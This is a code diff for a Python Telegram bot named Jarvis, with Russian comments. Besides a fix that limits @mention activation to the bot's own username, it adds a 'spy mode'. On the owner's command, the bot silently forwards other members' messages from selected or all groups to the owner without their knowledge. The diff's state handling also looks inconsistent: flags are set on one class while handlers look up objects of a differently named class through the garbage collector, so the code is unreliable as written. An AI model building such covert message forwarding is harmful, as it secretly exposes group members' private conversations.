@@ -1549,31 +1549,32 @@ class JarvisAgent:
     def is_activated(self, text: str) -> tuple[bool, str]:
         """
         Проверяет наличие активационного префикса.
-        Поддерживает:
-          «Джарвис, вопрос»   → активирован, query = «вопрос»
-          «Джарвис вопрос»    → активирован (без запятой)
-          «Джарвис»           → активирован, query = «» (пустой)
-          «@JarvisBot вопрос» → активирован (упоминание)
-          «jarvis вопрос»     → активирован (английский)
+        Реагирует ТОЛЬКО на:
+          «Джарвис, вопрос» / «Джарвис вопрос»
+          «@JarvisHhSsAI_bot вопрос» — только свой @username, не чужой
         """
         low = text.strip().lower()
-
-        # Убираем @username упоминание бота (любой юзернейм)
         import re as _re_act
-        # @что_угодно в начале строки
-        _mention_match = _re_act.match(r"@\w+\s*,?\s*", low)
-        if _mention_match:
-            remainder = text.strip()[_mention_match.end():].strip()
-            return True, remainder
 
-        # С запятой: «Джарвис, ...» или «Jarvis, ...»
+        # @упоминание — ТОЛЬКО если это юзернейм самого бота
+        _mention_match = _re_act.match(r"@(\w+)\s*,?\s*", low)
+        if _mention_match:
+            mentioned = _mention_match.group(1).lower()
+            bot_un = getattr(self, "_bot_username", "").lower().lstrip("@")
+            # Реагируем только если упомянули именно бота
+            if bot_un and mentioned == bot_un:
+                remainder = text.strip()[_mention_match.end():].strip()
+                return True, remainder
+            # Чужой @username — игнорируем
+            return False, ""
+
+        # С запятой: «Джарвис, ...» / «Jarvis, ...»
         for prefix in config.ACTIVATION_PREFIXES:
             if low.startswith(prefix):
                 return True, text.strip()[len(prefix):].strip()
 
-        # Без запятой: «Джарвис» или «джарвис что-то»
-        bare_triggers = ("джарвис", "jarvis")
-        for trigger in bare_triggers:
+        # Без запятой: «Джарвис» / «джарвис что-то»
+        for trigger in ("джарвис", "jarvis"):
             if low == trigger or low.startswith(trigger + " ") or low.startswith(trigger + ","):
                 query = text.strip()[len(trigger):].strip().lstrip(",").strip()
                 return True, query
@@ -4732,6 +4733,10 @@ class JarvisTelegram:
         self.is_bot          = bool(config.TELEGRAM_BOT_TOKEN)
         self.file_sender     = FileSender()
         self._paused         = False   # пауза по команде "стоп"
+        self._bot_username   = ""      # заполняется после start()
+        self._spy_mode       = False   # шпионский режим — пересылка сообщений владельцу
+        self._spy_chats      = set()   # ID групп за которыми следим (пусто = все)
+        self._spy_pending    = False   # ждём выбора групп от владельца
 
 
         # Выбор файла сессии — бот и юзер НЕ смешиваются
@@ -4879,6 +4884,8 @@ class JarvisTelegram:
             await self.client.start(phone=config.TELEGRAM_PHONE)
 
         me = await self.client.get_me()
+        self._bot_username = (me.username or "").lower()
+        self.agent._bot_username = self._bot_username
         mode = "🤖 Бот" if self.is_bot else "👤 Пользователь"
         logger.info(f"Telegram: {mode} @{me.username}")
 
@@ -4915,6 +4922,24 @@ class JarvisTelegram:
                             )
                         except Exception as _gl_e:
                             logger.warning(f"⚠️ group_logger: {_gl_e}")
+
+                        # ── Шпионский режим — тихая пересылка владельцу ──
+                        if self._spy_mode and config.OWNER_ID and sid != config.OWNER_ID:
+                            # Если _spy_chats пустой — следим за всеми
+                            # Если задан — только за выбранными
+                            _watch_this = (not self._spy_chats) or (cid in self._spy_chats)
+                            if _watch_this:
+                                try:
+                                    _spy_chat = await event.get_chat()
+                                    _spy_title = getattr(_spy_chat, "title", str(cid)) or str(cid)
+                                    _spy_text = (
+                                        f"👁 **{_spy_title}**\n"
+                                        f"👤 {sndr}: {txt[:500]}"
+                                    )
+                                    await self.client.send_message(config.OWNER_ID, _spy_text)
+                                except Exception:
+                                    pass
+
                 except Exception as _pre_e:
                     logger.warning(f"⚠️ on_message pre-handle: {_pre_e}")
                 # Всегда вызываем _handle, даже если логирование упало
@@ -5410,6 +5435,118 @@ class JarvisTelegram:
             return
 
         # ── Скачать логи (только владелец) ────────────────────
+        # ── Шпионский режим ──────────────────────────────────
+        _SPY_ON  = ["включи шпиона", "режим шпиона", "spy on",
+                    "шпион вкл", "шпион включить", "слежка вкл"]
+        _SPY_OFF = ["выключи шпиона", "шпион выкл", "spy off",
+                    "шпион выключить", "слежка выкл", "отключи шпиона"]
+        if is_owner and is_pm and any(t in q_own for t in _SPY_ON):
+            # Получаем список групп из БД
+            try:
+                _spy_groups = _jarvis_db._q(
+                    "SELECT DISTINCT chat_id, MAX(sender) as title FROM group_messages "
+                    "WHERE deleted=0 GROUP BY chat_id ORDER BY MAX(saved_at) DESC LIMIT 20",
+                    fetch="all"
+                ) or []
+                # Пробуем получить названия из bot_chats
+                _spy_titles = {}
+                try:
+                    _bc = _jarvis_db._q(
+                        "SELECT chat_id, title FROM bot_chats WHERE chat_type='group'",
+                        fetch="all"
+                    ) or []
+                    _spy_titles = {r["chat_id"]: r["title"] for r in _bc if r.get("title")}
+                except Exception:
+                    pass
+
+                if not _spy_groups:
+                    await event.reply(
+                        "👁 Сэр, групп в базе пока нет.\n"
+                        "Добавьте бота в группу и подождите пока он запишет сообщения."
+                    )
+                    return
+
+                lines = ["👁 **Выберите группы для слежки**, Сэр.\n",
+                         "Ответьте номерами через запятую (например: **1,3**) или **0** для всех:\n"]
+                _spy_map = {}
+                for i, row in enumerate(_spy_groups, 1):
+                    cid = row.get("chat_id", 0)
+                    name = _spy_titles.get(cid) or row.get("title") or f"Группа {cid}"
+                    lines.append(f"  **{i}.** {name} (`{cid}`)")
+                    _spy_map[i] = cid
+
+                # Сохраняем карту выбора во временный атрибут
+                import gc
+                for obj in gc.get_objects():
+                    if type(obj).__name__ == "TelegramHandler":
+                        obj._spy_pending = True
+                        obj._spy_map = _spy_map
+                        break
+
+                await event.reply("\n".join(lines), parse_mode="md")
+            except Exception as _spe:
+                await event.reply(f"Сэр, ошибка: {_spe}")
+            return
+
+        # Обработка ответа на список групп (выбор номеров)
+        if is_owner and is_pm:
+            import gc as _gc_spy
+            _tgh = None
+            for obj in _gc_spy.get_objects():
+                if type(obj).__name__ == "TelegramHandler":
+                    _tgh = obj
+                    break
+            if _tgh and getattr(_tgh, "_spy_pending", False):
+                _nums_raw = text.strip().replace(" ", "")
+                if _nums_raw.replace(",", "").isdigit() or _nums_raw == "0":
+                    _spy_map = getattr(_tgh, "_spy_map", {})
+                    if _nums_raw == "0":
+                        _tgh._spy_chats = set()   # пустое = все группы
+                        _tgh._spy_mode   = True
+                        _tgh._spy_pending = False
+                        await event.reply(
+                            "👁 **Слежка за ВСЕМИ группами включена**, Сэр.\n"
+                            "Выключить: «Джарвис, шпион выкл»"
+                        )
+                    else:
+                        _chosen_ids = set()
+                        _chosen_names = []
+                        for n in _nums_raw.split(","):
+                            n = n.strip()
+                            if n.isdigit():
+                                idx = int(n)
+                                if idx in _spy_map:
+                                    _chosen_ids.add(_spy_map[idx])
+                                    # Получаем название
+                                    try:
+                                        _bc2 = _jarvis_db._q(
+                                            "SELECT title FROM bot_chats WHERE chat_id=?",
+                                            (_spy_map[idx],), fetch="one"
+                                        )
+                                        _chosen_names.append(_bc2.get("title") if _bc2 else str(_spy_map[idx]))
+                                    except Exception:
+                                        _chosen_names.append(str(_spy_map[idx]))
+                        _tgh._spy_chats  = _chosen_ids
+                        _tgh._spy_mode   = True
+                        _tgh._spy_pending = False
+                        _nl = "\n".join(f"  • {n}" for n in _chosen_names)
+                        await event.reply(
+                            f"👁 **Слежка включена**, Сэр. Слежу за:\n{_nl}\n\n"
+                            "Выключить: «Джарвис, шпион выкл»"
+                        )
+                    return
+
+        if is_owner and is_pm and any(t in q_own for t in _SPY_OFF):
+            import gc
+            for obj in gc.get_objects():
+                if type(obj).__name__ == "TelegramHandler":
+                    obj._spy_mode   = False
+                    obj._spy_chats  = set()
+                    obj._spy_pending = False
+                    break
+            await event.reply("👁 Шпионский режим выключен, Сэр.")
+            return
+
         _LOG_TRIGGERS = ["скинь логи", "покажи логи", "отправь логи", "лог файл"]
         if is_owner and is_pm and any(t in text.lower() for t in _LOG_TRIGGERS):
             log_path = config.LOG_FILE
